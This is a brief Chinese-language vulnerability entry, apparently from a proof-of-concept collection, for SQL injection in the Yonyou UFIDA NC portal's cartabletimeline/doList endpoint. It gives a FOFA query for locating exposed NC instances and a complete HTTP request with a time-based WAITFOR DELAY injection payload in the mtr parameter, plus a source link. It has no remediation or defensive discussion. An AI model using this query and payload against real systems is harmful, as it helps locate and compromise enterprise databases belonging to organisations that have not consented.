# 用友NC-cartabletimeline存在SQL注入漏洞

## fofa

```yaml
app="用友-UFIDA-NC"
```

## poc

```javascript
GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:2%27--+ HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Priority: u=4
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411280915472.png)



## 漏洞来源

- https://forum.butian.net/article/627
